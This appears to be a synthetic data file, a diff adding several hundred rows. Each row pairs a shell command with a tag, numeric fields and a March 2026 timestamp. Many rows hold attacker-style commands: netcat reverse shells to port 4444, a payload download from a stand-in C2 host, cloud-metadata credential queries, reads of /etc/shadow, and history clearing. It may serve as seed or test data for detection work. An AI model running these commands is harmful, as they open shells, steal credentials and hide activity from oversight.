+193	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=630	4	2	1	2026-03-31 02:23:05.244052
+194	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=596	6	4	2	2026-03-30 23:11:19.589046
+195	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=6	1	4	4	2026-03-31 08:40:56.688116
+196	docker images --tag=805	5	2	2	2026-03-30 23:29:57.12021
+197	base64 /etc/passwd | head -n 5 --tag=734	2	4	4	2026-03-31 05:10:14.88742
+198	sudo -l --tag=985	6	2	1	2026-03-31 03:03:00.250973
+199	cat /etc/shadow --tag=759	1	3	3	2026-03-30 18:14:22.290446
+200	netstat -antp --tag=212	3	3	5	2026-03-30 22:07:55.853435
+201	cat /etc/shadow --tag=442	3	1	5	2026-03-31 08:46:48.157132
+202	sudo -l --tag=592	6	2	3	2026-03-31 11:15:00.929134
+203	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=716	6	4	2	2026-03-31 16:21:48.982571
+204	ps -ef --forest --tag=713	4	1	1	2026-03-30 19:49:10.336638
+205	whoami /all --tag=109	4	3	1	2026-03-30 18:23:11.713782
+206	kubectl get pods --all-namespaces --tag=619	4	3	4	2026-03-31 11:36:55.777454
+207	ps -ef --forest --tag=476	3	1	3	2026-03-31 11:48:19.097181
+208	nc -e /bin/sh 10.0.0.234 4444 --tag=177	1	4	1	2026-03-31 03:18:31.249257
+209	grep -r "password" /var/www/html/ --tag=366	4	1	4	2026-03-31 11:45:54.456963
+210	docker images --tag=937	5	4	4	2026-03-30 18:01:40.184754
+211	base64 /etc/passwd | head -n 5 --tag=395	2	3	5	2026-03-31 14:47:04.692478
+212	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=243	3	4	5	2026-03-30 17:39:02.281036
+213	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=411	5	2	1	2026-03-31 11:46:41.903637
+214	export HISTCONTROL=ignoredups --tag=688	2	1	3	2026-03-30 18:26:06.993895
+215	sudo -l --tag=717	4	1	3	2026-03-31 16:46:17.980588
+216	base64 /etc/passwd | head -n 5 --tag=612	6	3	5	2026-03-31 08:12:42.494763
+217	ps -ef --forest --tag=251	6	2	1	2026-03-30 23:02:23.585818
+218	tcpdump -i eth0 -c 10 --tag=99	2	2	3	2026-03-31 04:35:50.032385
+219	whoami /all --tag=160	1	1	3	2026-03-31 14:05:43.408198
+220	history -c --tag=498	1	3	3	2026-03-30 19:40:23.483542
+221	cat /etc/shadow --tag=202	6	2	2	2026-03-31 04:36:36.10796
+222	docker images --tag=838	3	2	1	2026-03-31 00:19:54.704809
+223	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=765	6	1	2	2026-03-31 01:37:19.201485
+224	kubectl get pods --all-namespaces --tag=463	5	2	5	2026-03-31 14:09:40.27066
+225	crontab -l --tag=531	2	2	2	2026-03-31 16:03:21.406054
+226	kubectl get pods --all-namespaces --tag=387	5	3	3	2026-03-31 14:03:00.320181
+227	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=779	5	4	3	2026-03-31 14:42:54.640738
+228	tcpdump -i eth0 -c 10 --tag=468	4	4	3	2026-03-31 09:18:30.688172
+229	ls -laR /home/ --tag=132	1	4	2	2026-03-30 23:55:10.76954
+230	nc -e /bin/sh 10.0.0.216 4444 --tag=171	2	4	2	2026-03-31 08:24:42.061495
+231	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=810	3	4	3	2026-03-31 02:51:22.14417
+232	history -c --tag=530	5	3	1	2026-03-30 19:02:08.134063
+233	export HISTCONTROL=ignoredups --tag=805	1	4	5	2026-03-31 17:01:21.897172
+234	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=57	3	3	4	2026-03-31 13:30:45.948445
+235	cat /etc/shadow --tag=760	2	4	3	2026-03-31 13:11:49.570191
+236	cat /etc/shadow --tag=934	5	4	3	2026-03-31 16:15:46.929189
+237	find / -perm -4000 -type f 2>/dev/null --tag=586	1	2	5	2026-03-31 13:37:15.187299
+238	ps -ef --forest --tag=622	1	1	1	2026-03-30 22:16:51.029394
+239	whoami /all --tag=203	2	1	2	2026-03-31 11:53:34.174751
+240	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=490	1	1	1	2026-03-31 07:42:11.810855
+241	whoami /all --tag=593	2	2	4	2026-03-30 22:25:26.298289
+242	base64 /etc/passwd | head -n 5 --tag=85	1	2	3	2026-03-30 18:36:44.509519
+243	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=900	4	1	3	2026-03-31 07:56:51.633212
+244	tcpdump -i eth0 -c 10 --tag=385	3	4	2	2026-03-31 07:15:08.700999
+245	history -c --tag=259	3	1	4	2026-03-31 02:11:53.793144
+246	sudo -l --tag=834	5	2	5	2026-03-31 02:26:05.730214
+247	base64 /etc/passwd | head -n 5 --tag=498	2	3	3	2026-03-31 13:44:21.042217
+248	history -c --tag=159	6	1	2	2026-03-31 15:14:51.222057
+249	netstat -antp --tag=273	2	4	5	2026-03-31 02:22:26.915718
+250	find / -perm -4000 -type f 2>/dev/null --tag=564	5	2	5	2026-03-30 23:10:01.280585
+251	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=147	6	4	4	2026-03-31 15:10:10.127465
+252	base64 /etc/passwd | head -n 5 --tag=336	3	1	5	2026-03-31 03:57:16.295697
+253	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=592	5	3	1	2026-03-30 20:49:49.217872
+254	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=120	4	3	5	2026-03-31 04:25:33.737453
+255	history -c --tag=715	1	4	5	2026-03-31 06:25:32.04439
+256	find / -perm -4000 -type f 2>/dev/null --tag=281	5	1	5	2026-03-31 13:10:37.118119
+257	grep -r "password" /var/www/html/ --tag=971	3	1	2	2026-03-31 15:56:25.873933
+258	tcpdump -i eth0 -c 10 --tag=170	3	3	1	2026-03-31 10:35:20.779752
+259	tcpdump -i eth0 -c 10 --tag=140	4	2	1	2026-03-31 08:33:27.937885
+260	export HISTCONTROL=ignoredups --tag=831	6	1	2	2026-03-30 17:40:07.407535
+261	base64 /etc/passwd | head -n 5 --tag=526	6	2	1	2026-03-31 03:46:49.793238
+262	cat /etc/shadow --tag=887	6	1	4	2026-03-30 20:14:08.673488
+263	nc -e /bin/sh 10.0.0.52 4444 --tag=875	3	4	3	2026-03-30 23:09:24.177338
+264	ps -ef --forest --tag=109	4	3	1	2026-03-31 07:16:14.344449
+265	ls -laR /home/ --tag=609	2	4	5	2026-03-31 08:56:39.546335
+266	cat /etc/shadow --tag=346	4	1	3	2026-03-31 01:10:35.508595
+267	crontab -l --tag=199	2	3	5	2026-03-31 13:54:33.509889
+268	tcpdump -i eth0 -c 10 --tag=726	6	4	4	2026-03-31 06:51:14.407739
+269	cat /etc/shadow --tag=102	4	1	5	2026-03-31 06:18:35.053841
+270	ls -laR /home/ --tag=242	3	2	3	2026-03-31 12:46:08.858347
+271	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=537	6	4	1	2026-03-31 00:39:43.377356
+272	base64 /etc/passwd | head -n 5 --tag=923	5	3	5	2026-03-31 10:06:27.208194
+273	base64 /etc/passwd | head -n 5 --tag=749	1	2	5	2026-03-30 23:11:25.79593
+274	whoami /all --tag=956	1	2	5	2026-03-31 05:37:18.0323
+275	crontab -l --tag=224	6	2	1	2026-03-31 17:13:42.611868
+276	tcpdump -i eth0 -c 10 --tag=349	6	1	1	2026-03-31 16:42:36.128115
+277	cat /etc/shadow --tag=17	3	3	4	2026-03-30 22:11:49.687046
+278	tcpdump -i eth0 -c 10 --tag=321	5	3	1	2026-03-30 22:48:30.698637
+279	nc -e /bin/sh 10.0.0.105 4444 --tag=453	4	4	4	2026-03-30 23:20:39.975974
+280	cat /etc/shadow --tag=495	1	3	2	2026-03-31 03:43:46.252697
+281	find / -perm -4000 -type f 2>/dev/null --tag=996	6	3	3	2026-03-31 03:15:06.85257
+282	sudo -l --tag=557	1	1	4	2026-03-31 15:18:40.077588
+283	docker images --tag=339	6	3	5	2026-03-31 09:24:22.69739
+284	ps -ef --forest --tag=908	6	2	4	2026-03-31 00:19:51.333391
+285	ps -ef --forest --tag=704	6	2	3	2026-03-31 07:59:54.360298
+286	base64 /etc/passwd | head -n 5 --tag=994	4	4	1	2026-03-31 07:01:29.795066
+287	base64 /etc/passwd | head -n 5 --tag=432	5	2	5	2026-03-31 17:22:11.186227
+288	nc -e /bin/sh 10.0.0.101 4444 --tag=142	4	2	2	2026-03-31 16:36:09.394868
+289	ls -laR /home/ --tag=929	1	4	1	2026-03-31 11:43:16.551115
+290	nc -e /bin/sh 10.0.0.219 4444 --tag=698	1	4	2	2026-03-31 14:01:19.068614
+291	nc -e /bin/sh 10.0.0.96 4444 --tag=105	5	1	4	2026-03-30 23:46:16.187463
+292	netstat -antp --tag=397	6	2	4	2026-03-31 03:06:42.675745
+293	kubectl get pods --all-namespaces --tag=452	1	4	1	2026-03-31 13:37:26.990688
+294	find / -perm -4000 -type f 2>/dev/null --tag=43	6	2	1	2026-03-30 20:00:58.471502
+295	whoami /all --tag=845	5	1	2	2026-03-30 18:48:25.882597
+296	history -c --tag=867	5	1	5	2026-03-31 02:35:19.552651
+297	netstat -antp --tag=206	6	4	5	2026-03-31 10:53:21.865221
+298	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=251	5	1	4	2026-03-31 04:13:20.631301
+299	whoami /all --tag=754	5	1	4	2026-03-30 20:58:58.359234
+300	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=306	3	3	5	2026-03-31 14:54:06.42208
+301	cat /etc/shadow --tag=317	4	2	1	2026-03-31 03:08:57.093135
+302	ps -ef --forest --tag=120	6	1	1	2026-03-30 21:13:26.999758
+303	crontab -l --tag=571	2	2	5	2026-03-31 13:15:14.593675
+304	grep -r "password" /var/www/html/ --tag=89	4	1	5	2026-03-31 14:01:57.118137
+305	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=274	3	1	1	2026-03-31 02:19:19.327879
+306	tcpdump -i eth0 -c 10 --tag=426	3	1	5	2026-03-31 11:20:17.680848
+307	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=247	5	4	2	2026-03-30 23:41:16.95209
+308	tcpdump -i eth0 -c 10 --tag=497	2	3	3	2026-03-31 09:43:23.915311
+309	sudo -l --tag=611	3	4	3	2026-03-30 23:04:16.419471
+310	ls -laR /home/ --tag=705	4	4	2	2026-03-31 17:21:13.189987
+311	nc -e /bin/sh 10.0.0.224 4444 --tag=816	5	2	1	2026-03-31 13:50:52.59779
+312	netstat -antp --tag=809	2	1	1	2026-03-31 15:02:24.08676
+313	netstat -antp --tag=465	4	2	5	2026-03-31 09:28:00.721242
+314	grep -r "password" /var/www/html/ --tag=212	2	4	2	2026-03-31 12:52:41.176637
+315	ps -ef --forest --tag=739	5	2	4	2026-03-31 07:08:25.566784
+316	cat /etc/shadow --tag=305	5	2	3	2026-03-31 05:27:06.320444
+317	docker images --tag=279	1	1	3	2026-03-31 16:20:45.256317
+318	export HISTCONTROL=ignoredups --tag=310	6	1	4	2026-03-30 20:06:23.833994
+319	grep -r "password" /var/www/html/ --tag=615	2	3	4	2026-03-31 05:51:02.319448
+320	ls -laR /home/ --tag=998	1	4	4	2026-03-31 14:45:59.526003
+321	nc -e /bin/sh 10.0.0.228 4444 --tag=490	3	2	4	2026-03-30 23:43:30.867308
+322	ps -ef --forest --tag=202	4	3	3	2026-03-30 18:39:09.587622
+323	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=935	5	1	2	2026-03-31 11:10:55.122252
+324	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=598	1	3	3	2026-03-31 13:58:39.440565
+325	docker images --tag=443	3	1	2	2026-03-31 09:30:48.860919
+326	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=947	1	2	1	2026-03-31 06:51:43.040727
+327	tcpdump -i eth0 -c 10 --tag=897	6	1	4	2026-03-31 09:55:59.523639
+328	ps -ef --forest --tag=738	5	1	1	2026-03-31 14:45:38.734742
+329	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=528	3	2	2	2026-03-31 07:33:56.109815
+330	kubectl get pods --all-namespaces --tag=415	2	2	2	2026-03-31 00:46:53.804811
+331	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=318	1	1	1	2026-03-30 20:07:54.186684
+332	docker images --tag=588	4	1	2	2026-03-31 07:28:27.271849
+333	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=888	6	1	4	2026-03-31 15:34:45.173904
+334	ps -ef --forest --tag=603	1	4	4	2026-03-31 13:00:07.57817
+335	docker images --tag=710	3	3	1	2026-03-30 23:23:49.874702
+336	history -c --tag=184	6	4	1	2026-03-31 15:03:44.250426
+337	docker images --tag=672	4	1	2	2026-03-31 05:53:07.322226
+338	cat /etc/shadow --tag=531	5	3	3	2026-03-31 00:02:59.456299
+339	sudo -l --tag=513	1	3	1	2026-03-31 14:40:06.521958
+340	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=435	2	2	2	2026-03-31 12:21:52.240688
+341	find / -perm -4000 -type f 2>/dev/null --tag=9	2	2	3	2026-03-31 00:16:18.45325
+342	ps -ef --forest --tag=374	4	3	3	2026-03-31 13:04:55.017104
+343	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=40	1	2	2	2026-03-31 05:20:22.214261
+344	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=791	5	2	1	2026-03-31 14:23:54.196323
+345	crontab -l --tag=616	4	4	2	2026-03-31 15:00:03.403462
+346	kubectl get pods --all-namespaces --tag=555	4	4	5	2026-03-31 03:42:30.039757
+347	kubectl get pods --all-namespaces --tag=281	6	3	5	2026-03-30 20:41:45.099848
+348	whoami /all --tag=210	2	3	2	2026-03-30 21:08:39.611525
+349	export HISTCONTROL=ignoredups --tag=723	6	4	1	2026-03-30 18:58:10.145682
+350	whoami /all --tag=876	4	2	1	2026-03-31 15:51:59.338467
+351	ps -ef --forest --tag=203	2	3	2	2026-03-31 01:42:14.115917
+352	whoami /all --tag=47	1	3	1	2026-03-30 19:27:11.938391
+353	find / -perm -4000 -type f 2>/dev/null --tag=616	4	2	5	2026-03-31 11:21:51.12275
+354	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=364	2	3	3	2026-03-31 00:12:46.449824
+355	find / -perm -4000 -type f 2>/dev/null --tag=817	1	1	3	2026-03-31 01:13:13.439868
+356	cat /etc/shadow --tag=852	2	3	2	2026-03-31 00:40:26.772748
+357	sudo -l --tag=491	1	2	1	2026-03-31 03:39:56.256632
+358	cat /etc/shadow --tag=311	1	3	1	2026-03-31 04:41:10.85005
+359	kubectl get pods --all-namespaces --tag=854	1	4	1	2026-03-31 03:53:15.835594
+360	history -c --tag=119	2	2	4	2026-03-31 11:42:27.932038
+361	ls -laR /home/ --tag=499	1	1	4	2026-03-31 17:03:47.068056
+362	history -c --tag=438	2	3	5	2026-03-31 11:15:32.04128
+363	find / -perm -4000 -type f 2>/dev/null --tag=478	2	3	4	2026-03-31 04:57:49.359089
+364	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=938	4	4	3	2026-03-31 06:24:10.775125
+365	find / -perm -4000 -type f 2>/dev/null --tag=514	5	1	5	2026-03-31 09:50:13.791915
+366	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=699	6	4	4	2026-03-31 07:10:26.132403
+367	find / -perm -4000 -type f 2>/dev/null --tag=786	6	3	2	2026-03-31 07:17:40.345774
+368	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=135	6	4	4	2026-03-31 12:05:00.845746
+369	base64 /etc/passwd | head -n 5 --tag=760	5	4	4	2026-03-31 02:04:31.15279
+370	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=638	6	3	1	2026-03-31 10:11:27.13362
+371	cat /etc/shadow --tag=690	3	1	2	2026-03-31 11:19:11.9618
+372	kubectl get pods --all-namespaces --tag=58	1	1	5	2026-03-31 07:31:08.662694
+373	docker images --tag=597	3	2	3	2026-03-31 01:53:34.040408
+374	netstat -antp --tag=871	2	2	3	2026-03-31 06:44:49.790285
+375	find / -perm -4000 -type f 2>/dev/null --tag=848	4	3	4	2026-03-30 21:26:05.111276
+376	netstat -antp --tag=311	5	2	3	2026-03-31 08:13:46.867272
+377	ls -laR /home/ --tag=357	3	4	4	2026-03-31 01:04:13.855186
+378	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=216	4	1	2	2026-03-31 02:45:01.853925
+379	kubectl get pods --all-namespaces --tag=48	2	4	5	2026-03-30 18:44:05.130972
+380	find / -perm -4000 -type f 2>/dev/null --tag=68	1	3	3	2026-03-30 21:01:42.462277
+381	docker images --tag=995	2	4	4	2026-03-31 12:33:17.958619
+382	tcpdump -i eth0 -c 10 --tag=769	2	4	1	2026-03-31 02:42:28.245456
+383	netstat -antp --tag=573	4	4	5	2026-03-31 11:12:29.614987
+384	grep -r "password" /var/www/html/ --tag=807	2	4	5	2026-03-31 14:24:34.14212
+385	docker images --tag=494	5	1	4	2026-03-31 14:51:10.480863
+386	tcpdump -i eth0 -c 10 --tag=213	4	2	2	2026-03-31 04:20:22.140121
+387	ps -ef --forest --tag=830	2	4	4	2026-03-30 23:44:58.713904
+388	tcpdump -i eth0 -c 10 --tag=627	1	2	1	2026-03-31 04:47:26.88771
+389	netstat -antp --tag=838	2	2	2	2026-03-31 03:46:53.639565
+390	docker images --tag=37	4	4	5	2026-03-30 19:59:53.555377
+391	docker images --tag=489	1	2	1	2026-03-31 04:45:44.869319
+392	docker images --tag=886	2	4	1	2026-03-31 10:25:31.602745
+393	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=80	1	4	1	2026-03-30 18:01:42.003675
+394	sudo -l --tag=589	6	1	4	2026-03-31 00:34:27.66406
+395	history -c --tag=43	6	2	3	2026-03-30 20:08:52.193323
+396	cat /etc/shadow --tag=287	4	2	5	2026-03-30 21:48:20.366989
+397	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=958	3	3	3	2026-03-31 06:33:51.490046
+398	kubectl get pods --all-namespaces --tag=555	6	4	4	2026-03-31 01:28:38.631808
+399	ps -ef --forest --tag=447	2	3	2	2026-03-31 08:05:10.433665
+400	netstat -antp --tag=178	5	3	5	2026-03-30 18:30:05.859045
+401	history -c --tag=244	2	4	4	2026-03-31 01:42:36.136057
+402	ls -laR /home/ --tag=543	5	3	1	2026-03-30 20:08:48.179979
+403	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=986	4	3	5	2026-03-31 11:41:18.006977
+404	export HISTCONTROL=ignoredups --tag=50	3	4	1	2026-03-31 00:00:11.38481
+405	export HISTCONTROL=ignoredups --tag=760	5	1	3	2026-03-31 08:45:33.032814
+406	netstat -antp --tag=636	2	1	4	2026-03-31 10:51:05.002274
+407	grep -r "password" /var/www/html/ --tag=41	1	2	5	2026-03-31 01:41:12.400695
+408	find / -perm -4000 -type f 2>/dev/null --tag=218	1	3	4	2026-03-31 05:13:02.115706
+409	grep -r "password" /var/www/html/ --tag=512	6	4	1	2026-03-31 09:36:42.381765
+410	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=293	6	4	4	2026-03-31 01:43:29.174821
+411	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=372	5	3	2	2026-03-31 10:21:00.143359
+412	export HISTCONTROL=ignoredups --tag=132	4	3	1	2026-03-30 18:05:55.57682
+413	netstat -antp --tag=587	1	1	1	2026-03-30 17:44:39.249653
+414	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=350	2	2	3	2026-03-31 04:35:11.220038
+415	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=600	2	1	1	2026-03-31 14:55:52.13484
+416	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=476	1	3	3	2026-03-31 07:42:03.601873
+417	ps -ef --forest --tag=935	3	1	4	2026-03-31 09:43:39.474939
+418	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=254	3	4	4	2026-03-31 00:40:42.628892
+419	docker images --tag=757	6	2	1	2026-03-31 16:36:50.395782
+420	base64 /etc/passwd | head -n 5 --tag=427	2	3	4	2026-03-31 16:32:59.333766
+421	crontab -l --tag=507	5	4	4	2026-03-31 10:54:02.897829
+422	find / -perm -4000 -type f 2>/dev/null --tag=136	3	1	3	2026-03-31 06:20:40.286467
+423	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=42	3	1	1	2026-03-31 13:48:46.824752
+424	nc -e /bin/sh 10.0.0.129 4444 --tag=563	5	3	2	2026-03-31 00:10:41.509704
+425	sudo -l --tag=627	4	3	4	2026-03-31 09:10:11.070652
+426	history -c --tag=549	5	4	4	2026-03-30 18:41:43.495189
+427	base64 /etc/passwd | head -n 5 --tag=389	1	2	4	2026-03-31 09:51:37.767196
+428	kubectl get pods --all-namespaces --tag=938	1	4	5	2026-03-31 04:00:09.561805
+429	sudo -l --tag=530	5	3	1	2026-03-31 15:22:41.465133
+430	sudo -l --tag=940	6	4	1	2026-03-31 11:19:00.331897
+431	netstat -antp --tag=645	6	1	1	2026-03-31 16:26:45.26425
+432	find / -perm -4000 -type f 2>/dev/null --tag=638	6	2	2	2026-03-30 22:17:58.107512
+433	crontab -l --tag=692	3	4	2	2026-03-31 13:12:17.78758
+434	nc -e /bin/sh 10.0.0.149 4444 --tag=987	4	1	3	2026-03-31 12:56:14.250591
+435	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=450	5	1	4	2026-03-31 10:52:23.141
+436	ls -laR /home/ --tag=95	6	2	3	2026-03-31 06:43:20.756753
+437	base64 /etc/passwd | head -n 5 --tag=934	1	2	5	2026-03-31 00:23:11.667546
+438	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=251	6	3	4	2026-03-31 10:57:26.503549
+439	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=888	4	2	1	2026-03-31 16:23:32.241219
+440	whoami /all --tag=93	2	4	4	2026-03-31 06:57:09.377817
+441	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=383	6	2	3	2026-03-31 17:13:24.920016
+442	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=429	5	2	2	2026-03-31 10:57:15.093558
+443	netstat -antp --tag=386	2	2	1	2026-03-30 22:54:31.789208
+444	find / -perm -4000 -type f 2>/dev/null --tag=480	2	4	5	2026-03-31 04:05:40.825791
+445	export HISTCONTROL=ignoredups --tag=51	6	3	4	2026-03-31 08:57:53.621737
+446	docker images --tag=434	4	1	5	2026-03-31 13:17:59.366121
+447	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=754	3	4	3	2026-03-31 04:16:07.196317
+448	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=661	3	3	4	2026-03-30 20:50:04.305852
+449	sudo -l --tag=667	2	1	5	2026-03-31 13:27:30.334347
+450	grep -r "password" /var/www/html/ --tag=777	3	1	4	2026-03-30 19:57:27.068695
+451	crontab -l --tag=990	3	2	1	2026-03-31 04:59:09.521679
+452	docker images --tag=152	3	3	2	2026-03-31 15:02:50.972062
+453	base64 /etc/passwd | head -n 5 --tag=19	2	4	2	2026-03-31 16:36:01.117517
+454	sudo -l --tag=490	6	4	3	2026-03-31 10:52:07.071014
+455	grep -r "password" /var/www/html/ --tag=367	5	2	2	2026-03-31 03:47:44.614667
+456	find / -perm -4000 -type f 2>/dev/null --tag=683	4	2	3	2026-03-31 10:14:58.899945
+457	export HISTCONTROL=ignoredups --tag=84	4	3	4	2026-03-31 08:00:00.731619
+458	cat /etc/shadow --tag=449	5	4	5	2026-03-31 00:26:06.683936
+459	sudo -l --tag=425	2	4	1	2026-03-31 10:20:52.496417
+460	kubectl get pods --all-namespaces --tag=478	2	3	2	2026-03-30 22:42:21.779298
+461	find / -perm -4000 -type f 2>/dev/null --tag=468	4	4	3	2026-03-31 08:54:40.01628
+462	grep -r "password" /var/www/html/ --tag=100	2	2	2	2026-03-31 01:12:16.390557
+463	sudo -l --tag=359	4	4	3	2026-03-30 18:49:54.822351
+464	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=599	4	2	3	2026-03-31 07:28:05.723422
+465	whoami /all --tag=398	5	2	3	2026-03-31 08:52:59.442824
+466	cat /etc/shadow --tag=289	3	3	3	2026-03-31 06:48:14.65339
+467	docker images --tag=181	4	1	3	2026-03-31 09:49:13.51083
+468	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=348	3	2	1	2026-03-31 00:56:59.798615
+469	ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N "" --tag=799	4	2	4	2026-03-30 19:55:04.495433
+470	sudo -l --tag=199	5	4	5	2026-03-31 09:52:06.426048
+471	nc -e /bin/sh 10.0.0.99 4444 --tag=293	3	1	5	2026-03-31 03:27:31.828519
+472	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=880	6	1	3	2026-03-30 19:37:50.981519
+473	ps -ef --forest --tag=504	1	2	5	2026-03-31 11:52:08.943419
+474	python3 -c 'import pty; pty.spawn("/bin/bash")' --tag=872	2	3	2	2026-03-31 15:18:34.758916
+475	cat /etc/shadow --tag=789	1	2	3	2026-03-30 22:08:47.206959
+476	find / -perm -4000 -type f 2>/dev/null --tag=159	1	1	1	2026-03-30 19:47:39.813937
+477	grep -r "password" /var/www/html/ --tag=443	2	2	5	2026-03-31 01:03:45.559124
+478	kubectl get pods --all-namespaces --tag=189	4	1	1	2026-03-31 06:39:06.882483
+479	whoami /all --tag=914	4	2	5	2026-03-30 20:06:10.122683
+480	docker images --tag=603	6	1	5	2026-03-31 13:50:58.385657
+481	kubectl get pods --all-namespaces --tag=250	1	4	2	2026-03-31 11:14:13.667497
+482	docker images --tag=985	4	2	4	2026-03-31 09:02:02.36993
+483	ps -ef --forest --tag=588	2	3	2	2026-03-31 17:16:34.782586
+484	crontab -l --tag=529	2	1	4	2026-03-30 23:07:53.121592
+485	export HISTCONTROL=ignoredups --tag=20	6	4	2	2026-03-31 08:14:29.61275
+486	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=691	5	2	3	2026-03-31 12:47:30.623206
+487	base64 /etc/passwd | head -n 5 --tag=531	2	2	3	2026-03-31 01:38:34.96154
+488	whoami /all --tag=264	2	2	3	2026-03-31 12:31:43.671548
+489	ps -ef --forest --tag=431	1	4	5	2026-03-31 10:15:47.108907
+490	curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ --tag=918	6	4	4	2026-03-30 19:50:09.19244
+491	cat /etc/shadow --tag=681	5	3	5	2026-03-30 19:22:08.934294
+492	cat /etc/shadow --tag=722	3	4	1	2026-03-31 14:54:08.264353
+493	ps -ef --forest --tag=40	4	2	4	2026-03-31 05:06:24.976773
+494	sudo -l --tag=187	4	2	4	2026-03-30 18:52:18.331204
+495	kubectl get pods --all-namespaces --tag=372	5	3	5	2026-03-31 15:24:39.691968
+496	nc -e /bin/sh 10.0.0.3 4444 --tag=264	1	4	1	2026-03-31 00:37:31.854462
+497	sudo -l --tag=10	2	3	3	2026-03-31 11:43:16.646275
+498	sudo -l --tag=247	6	4	1	2026-03-31 02:09:55.923858
+499	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=457	2	4	3	2026-03-30 21:45:21.317308
+500	ps -ef --forest --tag=480	6	4	3	2026-03-31 11:16:49.093517
+501	history -c --tag=238	1	2	1	2026-03-31 06:05:21.855897
+502	whoami /all --tag=252	6	2	5	2026-03-31 00:51:17.709001
+503	export HISTCONTROL=ignoredups --tag=618	3	1	4	2026-03-31 05:35:36.501292
+504	netstat -antp --tag=956	6	3	3	2026-03-31 11:59:30.518885
+505	tcpdump -i eth0 -c 10 --tag=779	3	4	5	2026-03-31 16:03:03.752675
+506	whoami /all --tag=890	6	3	2	2026-03-30 19:21:55.687503
+507	docker images --tag=895	6	2	4	2026-03-31 02:15:30.214302
+508	nc -e /bin/sh 10.0.0.238 4444 --tag=384	4	4	2	2026-03-30 18:02:29.071703
+509	netstat -antp --tag=343	6	2	2	2026-03-31 09:10:07.769602
+510	docker images --tag=622	3	3	1	2026-03-31 08:53:56.028827
+511	sudo -l --tag=791	6	4	1	2026-03-31 13:59:23.787418
+512	ps -ef --forest --tag=783	5	4	3	2026-03-31 13:34:38.770078
+513	cat /etc/shadow --tag=815	2	1	3	2026-03-31 11:11:53.483635
+514	wget http://c2-server.com/payload.sh -O /tmp/payload.sh --tag=501	5	2	3	2026-03-31 04:43:22.566526
+515	kubectl get pods --all-namespaces --tag=377	4	2	5	2026-03-31 11:41:48.032806
+516	history -c --tag=937	3	3	1	2026-03-31 05:05:00.848165
+517	export HISTCONTROL=ignoredups --tag=136	1	3	2	2026-03-31 06:44:35.319472
+518	whoami /all --tag=335	5	3	2	2026-03-30 19:58:59.43585
+519	history -c --tag=776	4	2	5	2026-03-31 11:28:29.141523
+520	whoami /all --tag=312	3	1	2	2026-03-31 06:16:22.202054
+521	ps -ef --forest --tag=678	5	3	1	2026-03-30 20:02:12.405922
+522	tcpdump -i eth0 -c 10 --tag=504	2	4	5	2026-03-30 22:26:25.997997
+523	crontab -l --tag=370	4	1	4	2026-03-31 11:47:59.119657
